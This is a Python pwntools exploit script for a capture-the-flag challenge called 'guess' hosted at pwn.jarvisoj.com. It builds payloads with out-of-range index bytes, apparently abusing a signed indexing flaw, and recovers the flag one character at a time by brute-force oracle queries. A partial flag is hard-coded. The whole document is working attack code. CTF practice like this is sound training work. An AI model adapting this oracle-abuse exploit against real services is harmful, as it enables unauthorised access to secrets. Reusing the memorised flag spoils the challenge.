#!/usr/bin/env python
# -*- encoding: utf-8 -*-
__author__ = 'Albertchang'

from pwn import *
import string

context.log_level = "debug"
DEBUG = 1
LOCAL = 0
if LOCAL == 1:
    p = process('./pwn100')
else:
    # p = remote('127.0.0.1', 9999)
    p = remote('pwn.jarvisoj.com',9878)

# if DEBUG == 1:
#     context.terminal = ['gnome-terminal', '-x', 'zsh', '-c']
#     gdb.attach(proc.pidof(p)[0])

# data
data = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}'

# open elf
elf = ELF('./guess')
payload = ''
flag = 'PCTF{49d4310a1085875567932651e559e15'
for i in range(50):
	payload += '0'
	payload += chr(0x40+128+i)
p.recvuntil('guess>')

for i in range(len(flag),50):
    for ch in data:
        payload1 = payload[:2 * i] + ch.encode('hex') + payload[2*i+2:]
        print payload1
        print payload
        p.sendline(payload1)
        recv_data = p.recvline()
        p.recv()
        if 'Yaaaay! You guessed the flag correctly' in recv_data:
            flag += ch
            print flag
            break
        # print p.recvline()
print flag
p.interactive()

